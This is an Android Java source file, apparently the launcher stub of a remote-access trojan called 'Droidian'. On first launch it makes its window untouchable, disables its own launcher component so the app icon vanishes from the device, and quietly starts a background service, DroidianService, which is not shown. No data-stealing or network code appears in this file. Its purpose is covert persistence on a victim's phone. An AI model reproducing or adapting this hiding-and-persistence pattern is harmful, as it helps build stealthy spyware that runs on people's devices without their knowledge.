package com.connect;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.ContextWrapper;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.preference.Preference;
import android.provider.SyncStateContract.Constants;
import android.util.Log;
import android.view.WindowManager;

public class Droidian extends Activity {
   
    public void onCreate(Bundle savedInstanceState) { 
        super.onCreate(savedInstanceState);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE); 
        getWindow().setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_HIDDEN);
        PackageManager i = getApplicationContext().getPackageManager();
        i.setComponentEnabledSetting(getComponentName(),PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        
    	if(isMyServiceRunning()==false) 
    	{		
    		startService(new Intent(getApplicationContext(), DroidianService.class));
    		Log.i("com.connect","startService");
    	}
    }
	private boolean isMyServiceRunning() {
	    ActivityManager manager = (ActivityManager) getApplicationContext().getSystemService(Context.ACTIVITY_SERVICE);
	    for (RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
	        if (DroidianService.class.getName().equals(service.service.getClassName())) {
	            return true;   
	        }
	    }
	    return false;
	}
}